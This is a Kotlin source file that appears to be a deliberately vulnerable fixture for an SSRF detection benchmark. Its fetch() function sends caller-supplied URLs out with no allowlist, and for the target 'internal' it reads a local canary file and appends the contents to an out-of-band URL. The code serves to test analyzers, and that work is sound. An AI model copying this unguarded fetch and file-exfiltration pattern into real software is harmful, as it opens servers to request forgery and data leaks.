package com.example.web

import java.net.URI
import java.net.http.HttpClient
import java.net.http.HttpRequest
import java.net.http.HttpResponse
import java.net.URLEncoder
import java.nio.charset.StandardCharsets
import java.nio.file.Files
import java.nio.file.Path

/**
 * UrlFetcher is the first-party Kotlin fetch utility named by advisory
 * TEGRON-KT-SSRF-0001. fetch(String) is THE SSRF SINK: it forwards a
 * caller-supplied URL to an outbound HTTP request with no allowlist. The lane
 * analyzes the kotlinc-compiled bytecode; the call graph is
 * ingress(handle) -> UrlFetcher.fetch, identical in shape to the Java lane.
 *
 * SOUNDNESS: the canary beacon is intrinsic to the SSRF sink's own execution.
 * resolveTarget maps the special target name "internal" to the Tegron-controlled
 * OOB URL ($TEGRON_OOB_URL) WITH the planted seed (/tmp/tegron_canary) appended.
 * In the VULNERABLE build there is NO allowlist, so the unguarded outbound request
 * in fetch() actually issues that request — that outbound request IS the SSRF, and
 * it is the only thing that carries the seed off-host. A target the resolver does
 * not recognize is fetched verbatim and never touches the seed. On the PATCHED
 * build an allowlist rejects "internal" before any seed is read and before any
 * outbound request is made, so nothing is exfiltrated. A fired beacon is thus
 * attributable to the SSRF sink firing, not to a generic exfil.
 */
object UrlFetcher {
    private const val CANARY_SEED_PATH = "/tmp/tegron_canary"

    // resolveTarget maps a request target name to the URL the server will fetch.
    // The VULNERABLE build has no allowlist: "internal" resolves to the
    // Tegron-controlled OOB endpoint with the planted seed appended (the SSRF
    // exfil path); any other target is returned verbatim and never touches the
    // seed.
    private fun resolveTarget(name: String): String? {
        if (name == "internal") {
            val oob = System.getenv("TEGRON_OOB_URL")
            if (oob.isNullOrEmpty()) {
                return null
            }
            val seed = String(Files.readAllBytes(Path.of(CANARY_SEED_PATH)))
            return oob + "?kind=canary&data=" + URLEncoder.encode(seed, StandardCharsets.UTF_8)
        }
        return name
    }

    // fetch is THE SSRF SINK: an unguarded outbound request to a caller-influenced
    // URL. In the VULNERABLE build this fires for the "internal" target and carries
    // the seed to the OOB endpoint.
    fun fetch(target: String): Int {
        val resolved = resolveTarget(target) ?: return 400
        val client = HttpClient.newHttpClient()
        val request = HttpRequest.newBuilder(URI.create(resolved)).GET().build()
        val response = client.send(request, HttpResponse.BodyHandlers.ofInputStream())
        response.body().use { it.readAllBytes() }
        return response.statusCode()
    }
}
